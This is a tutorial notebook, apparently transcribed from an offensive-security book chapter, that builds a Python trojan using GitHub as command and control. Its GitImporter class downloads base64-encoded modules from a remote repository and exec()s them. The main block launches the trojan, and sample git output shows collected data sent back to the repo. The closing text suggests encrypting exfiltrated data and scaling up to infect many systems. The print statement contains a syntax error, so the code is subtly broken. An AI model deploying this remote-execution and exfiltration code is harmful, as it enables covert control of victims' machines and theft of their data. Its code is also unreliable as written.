{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyM2WiUkAYACqNwQ0CQQOxkw",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/damianiRiccardo90/BHP/blob/master/C7-Github_Command_And_Control/Hacking_Python_Import_Functionality.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "### *__Hacking Python's import Functionality__*\n",
        "\n",
        "If you've made it this far in the book, you know that we use Python's __import__ functionality to copy external libraries into our programs so we can use their code. We want to be able to do the same thing for our trojan. But since we're controlling a remote machine, we may want to use a package not available on that machine, and there's no easy way to install packages remotely. Beyond that, we also want to make sure that if we pull in a dependency, such as __Scapy__, our trojan makes that module available to all other modules that we pull in.\n",
        "\n",
        "Python allows us to customize how it imports modules; if it can't find a module locally, it will call an import class we define, which will allow us to remotely retrieve the library from our repo. We'll have to add our custom class to the __sys.meta_path__ list. Let's create this class now by adding the following code:"
      ],
      "metadata": {
        "id": "gV_0zGCxQxeP"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "class GitImporter:\n",
        "    def __init__(self):\n",
        "        self.current_module_code = ''\n",
        "\n",
        "    def find_module(self, name, path=None):\n",
        "        print('[*] Attempting to retrieve %s' %s name)\n",
        "        self.repo = github_connect()\n",
        "        new_library = get_file_contents('modules', f'{name}.py', self.repo)\n",
        "        if new_library is not None:\n",
        "            self.current_module_code = base64.b64decode(new_library) #[1]\n",
        "            return self\n",
        "\n",
        "    def load_module(self, name):\n",
        "        spec = importlib.util.spec_from_loader(name, loader=None,\n",
        "                                               origin=self.repo.git_url)\n",
        "        new_module = importlib.util.module_from_spec(spec) #[2]\n",
        "        exec(self.current_module_code, new_module.__dict__)\n",
        "        sys.modules[spec.name] = new_module #[3]\n",
        "        return new_module"
      ],
      "metadata": {
        "id": "ggK42k5xSpYF"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "Every time the interpreter attempts to load a module that isn't available, it will use this __GitImporter__ class. First, the __find_module__ method attempts to locate the module. We pass this call to our remote file loader. If we can locate the file in our repo, we base64-decode the code and store it in our class __[1]__. (Github will give us base64-encoded data.) By returning __self__, we indicate to the Python interpreter that we found the module and that it can call the __load_module__ method to actually load it. We use the native __importlib__ module to first create a new blank module object __[2]__ and then shovel the code we retrieved from Github into it. The last step is to insert the newly created module into the __sys.modules__ list __[3]__ so that it's picked up by any future __import__ calls.\n",
        "\n",
        "Now let's put the finishing touches on the trojan:"
      ],
      "metadata": {
        "id": "eFv167WPU4g6"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "if __name__ == '__main__':\n",
        "    sys.meta_path.append(GitImporter())\n",
        "    trojan = Trojan('abc')\n",
        "    trojan.run()"
      ],
      "metadata": {
        "id": "nI-wOoy7pT1a"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "In the __\\_\\_main\\_\\___ block, we put __GitImporter__ into the __sys.meta_path__ list, create the __Trojan__ object, and call its __run__ method.\n",
        "\n",
        "Now let's take it for a spin!"
      ],
      "metadata": {
        "id": "RAXjBg6-piDF"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "### *__Kicking the Tires__*\n",
        "\n",
        "All right! Let's test this thing out by running it from the command line.\n",
        "\n",
        "__[WARNING]__\n",
        "\n",
        "\n",
        "_If you have sensitive information in files or environment variables, remember that without a private repository, that information is going to go up to Github for the whole world to see. Don't say we didn't warn you. Of course, you could protect yourself using the encryption techniques you'll learn Chapter 9._\n",
        "\n",
        "```\n",
        "$ python git_trojan.py\n",
        "[*] Attempting to retrieve dirlister\n",
        "[*] Attempting to retrieve environment\n",
        "[*] In dirlister module\n",
        "[*] In environment module.\n",
        "```\n",
        "\n",
        "Perfect. It connected to the repository, retrieved the configuration file, pulled in the two modules we set in the configuration file, and ran them.\n",
        "\n",
        "Now from your trojan directory, enter the following on the command line:\n",
        "\n",
        "```\n",
        "$ git pull origin master\n",
        "From https://github.com/tiarno/bhptroian\n",
        "    6256823..8024199  master    -> origin/master\n",
        "Updating 6256823..8024199\n",
        "Fast-forward\n",
        "  data/abc/2020-03-29T11:29:19.475325.data | 1 +\n",
        "  data/abc/2020-03-29T11:29:24.479408.data | 1 +\n",
        "  data/abc/2020-03-29T11:40:27.694291.data | 1 +\n",
        "  data/abc/2020-03-29T11:40:33.696249.data | 1 +\n",
        "  4 files changed, 4 insertions(+)\n",
        "  create mode 100644 data/abc/2020-03-29T11:29:19.475325.data\n",
        "  create mode 100644 data/abc/2020-03-29T11:29:24.479408.data\n",
        "  create mode 100644 data/abc/2020-03-29T11:40:27.694291.data\n",
        "  create mode 100644 data/abc/2020-03-29T11:40:33.696249.data\n",
        "```\n",
        "\n",
        "Awesome! The trojan checked in the results of the two running modules.\n",
        "\n",
        "You could make a number of improvements and enhancements to this core command-and-control technique. Encrypting all your modules, configuration, and exfiltrated data would be a good start. You'd also need to automate the process of pulling down data, updating configuration files, and rolling out new trojans if you were going to infect systems on a massive scale. As you add more and more functionality, you'll also need to extend how Python loads dynamic and compiled libraries.\n",
        "\n",
        "For now, let's work on creating some standalone trojan tasks, and we'll leave it to you to integrate them into your new Github trojan."
      ],
      "metadata": {
        "id": "Op3llnWmraba"
      }
    }
  ]
}